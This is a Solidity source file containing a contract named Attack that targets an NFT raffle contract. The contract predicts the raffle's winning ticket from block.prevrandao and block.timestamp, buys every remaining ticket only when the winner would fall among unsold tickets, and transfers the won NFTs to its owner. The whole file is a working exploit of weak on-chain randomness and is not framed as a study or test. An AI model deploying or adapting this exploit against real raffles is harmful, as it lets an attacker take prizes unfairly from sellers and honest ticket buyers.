// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC721.sol";

interface Raffle {
    struct RaffleInfo {
        uint256 raffleId;
        uint256 tokenId;
        uint256 ticketPrice;
        uint256 endTime;
        uint128 leftTickets;
        uint128 totalTickets;
        address nftCa;
        address seller;
        address winner;
    }

    function buyTickets(uint256 raffleId, uint128 amount) external payable;

    function chooseWinnetr(uint256 raffleId, uint256 randNum) external;

    function claimAllNfts() external;

    function getRaffleInfo(
        uint256 raffleId
    ) external view returns (RaffleInfo memory);
}

contract Attack {
    struct Nft {
        address ca;
        uint256 tokenId;
    }

    Raffle private _raffleContract;
    Nft[] private _vault;
    address private _owner;
    mapping(address => uint256) balanceOf;

    event AttackEvent(bool isTriggered);

    constructor(address raffleCa) {
        _raffleContract = Raffle(raffleCa);
        _owner = msg.sender;
    }

    function attack(uint256 raffleId) external payable {
        Raffle.RaffleInfo memory raffleInfo = _raffleContract.getRaffleInfo(
            raffleId
        );
        uint256 soldTicketsAmount = raffleInfo.totalTickets -
            raffleInfo.leftTickets;

        uint256 randNum = 0;
        uint256 winnerTicketIndex = uint256(
            keccak256(
                abi.encodePacked(block.prevrandao, block.timestamp, randNum)
            )
        ) % raffleInfo.totalTickets;

        bool isTriggered;
        if (winnerTicketIndex >= soldTicketsAmount) {
            _raffleContract.buyTickets{value: msg.value}(
                raffleId,
                raffleInfo.leftTickets
            );
            _vault.push(Nft(raffleInfo.nftCa, raffleInfo.tokenId));
            isTriggered = true;
        } else {
            (bool success, ) = msg.sender.call{value: msg.value}("");
            if (!success) balanceOf[msg.sender] = msg.value;
        }

        emit AttackEvent(isTriggered);
    }

    function claimNfts() external {
        _raffleContract.claimAllNfts();

        for (uint i = 0; i < _vault.length; i++) {
            address ca = _vault[i].ca;
            uint256 tokenId = _vault[i].tokenId;
            IERC721(ca).transferFrom(address(this), _owner, tokenId);
        }
    }
}
